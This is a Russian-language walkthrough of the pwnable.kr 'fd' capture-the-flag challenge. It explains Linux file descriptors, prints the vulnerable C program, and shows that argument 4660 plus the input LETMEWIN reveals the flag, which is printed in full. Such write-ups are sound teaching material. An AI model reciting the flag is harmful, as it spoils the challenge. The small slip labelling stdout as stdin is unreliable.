### [](#fd-termin) Что такое файловый дескриптор?
<b>Файловый дескриптор</b> - говоря простыми словами, можно определить этот термин как положительное число, описывающее канал связи в Linux.
```
0 - стандартный ввод(stdin)
1 - стандартный вывод(stdout)
2 - стандартная ошибка(stderr)
```
Простой пример в терминале с командой ```cat```:
```bash
┌─[user@parrot]─[~]
└──╼ $cat

```
Сейчас вы находитесь на канале ```0(stdin)``` ваш курсор должен мигать(Ожидается ввод со стороны пользователя).

```bash
┌─[user@parrot]─[~]
└──╼ $cat
балалайка
балалайка
```
После ввода какого либо слова оно дублируется на экран - это так называемый стандартный вывод(1 - stdin)

Чтобы показать работу стандартной ошибки, приведу пример с несуществующей командой и перенаправлением определенного канала в файл.
```bash
┌─[user@parrot]─[~]
└──╼ $ qwerty
bash: qwerty: command not found
```
Но если мы перенаправим наш канал stderr(2) мы не увидим на экране ошибки. 
```bash
┌─[✗]─[user@parrot]─[~]
└──╼ $qwerty 2>/dev/null
┌─[✗]─[user@parrot]─[~]
└──╼ $
```
Мы перенаправили наш ```stderr``` в ```/dev/null``` и нам не вывелась ошибка как в первом примере.

## [](#step2) Шаг 2: Понимание задачи
Теперь когда мы знаем что такое файловый дескриптор мы наконец-то можем приступить к решению нашей задачи.
Чтобы начать решать ее нам нужно подключится к серверу, это можно сделать с помощью вот этой команды:
```bash
ssh fd@pwnable.kr -p2222
```
Вас попросят ввести пароль, который ```guest```. После успешного подключения к машине мы можем посмотреть что у нас находится в домашней директории
```bash
fd@ubuntu:~$ ls -la
total 44
drwxr-x---   5 root fd      4096 Apr  1  2025 .
drwxr-xr-x 118 root root    4096 Mar 20 02:21 ..
d---------   2 root root    4096 Jun 12  2014 .bash_history
----------   1 root root       0 Apr 30 05:11 .gdb_history
dr-xr-xr-x   2 root root    4096 Dec 19  2016 .irssi
drwxr-xr-x   2 root root    4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root fd_pwn 15148 Mar 26  2025 fd
-rw-r--r--   1 root root     452 Mar 26  2025 fd.c
-r--r-----   1 root fd_pwn    50 Apr  1  2025 flag
```
Обратим внимание на файл с кодом ```fd.c```, исполняемый(бинарный) файл ```fd``` и текстовый файл ```flag```.

Посмотрим на файл с нашим кодом с помощью команды ```cat```:
```bash
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		setregid(getegid(), getegid());
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```
Мы видим у нас есть функция main, которая в свою очередь проверяет количество передаваемых аргументов, если у нас не будет аргументов в программе, то программа выведет:
```bash
fd@ubuntu:~$ ./fd
pass argv[1] a number
```
После успешной проверки аргументов, создается переменная ```fd```, которая в свою очередь берет наш передаваемый аргумент и вычитает из него число в 16-ой системе счисления. 

> <b>atoi</b> - функция в си, которая переобразует строковое значение в числовое значение 

После у нас создается переменная ```len```, в которой потом вызывается ```read(fd, buf, 32)``` я так понимаю это чтение того что мы передали. 

И проверка, которая выдает нам флаг. Функция strcmp сравнит строку, сохранённую в буфере, со строкой "LETMEWIN\n", и если они равны, т.е. strcmp возвращает 0, условие if становится !0 (в C эквивалентно true).
Ключ к решению этой задачи — передать такой argv[1], который вычислит fd в файловый дескриптор, который мы можем контролировать и который содержит строку "LETMEWIN".
```bash
fd@ubuntu:~$ ./fd balalaika
learn about Linux file IO
```


## [](#step3) Атака
Вернемся к нашему шестнадцатиричному числу ```0x1234```, перевести мы его можем с помощью Python или же этого [сайта](https://www.rapidtables.com/convert/number/hex-to-decimal.html). В десятичной системе это число равняется ```4660```.

Теперь мы знаем чему равняется это число, но что дальше? Нам нужно контролировать этот дескриптор чтобы мы заполучили stdin, который обозначается 0. Инными словами нужно передать такой аргумент, который при вычитании числа 0x1234 будет равнятся 0. И поскольку мы уже знаем десятичное число мы можем уже решить эту задачу.

```bash
fd@ubuntu:~$ ./fd 134
learn about Linux file I
```
Ну и если мы передадим число 4660, программа начинает ждать еще одного ввода
```bash
fd@ubuntu:~$ ./fd 4660
hello 
learn about Linux file IO
```

На этом этапе я думаю уже понятно, что нужно делать. При втором вводе нам нужно ввести строку ```LETMEWIN``` и мы получим наш флаг

```bash
fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
Mama! Now_I_understand_what_file_descriptors_are!
```
